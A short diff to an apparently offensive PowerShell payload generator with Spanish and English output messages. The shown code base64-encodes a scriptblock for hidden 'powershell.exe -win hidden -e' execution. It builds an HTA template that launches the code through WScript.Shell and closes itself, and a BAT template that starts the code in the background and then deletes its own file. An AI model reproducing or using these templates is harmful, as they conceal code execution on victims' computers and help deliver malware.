@@ -101,7 +101,8 @@ $code = code_a_base64 -code $scriptblock; $code = "powershell.exe -win hidden -e
 
 $tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu codigo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep 1'
 $your_code =  'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Your code is: `n`n" -ForegroundColor Green -NoNewline  ; sleep 1'
-$plantilla_hta = "<html><head><script>var c= '$code' new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
+$plantilla_hta = "<html><head><script>var c= '$code' 
+new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
 $plantilla_bat = '@echo off
 start /b ' + $code + '
 start /b "" cmd /c del "%~f0"&exit /b' 
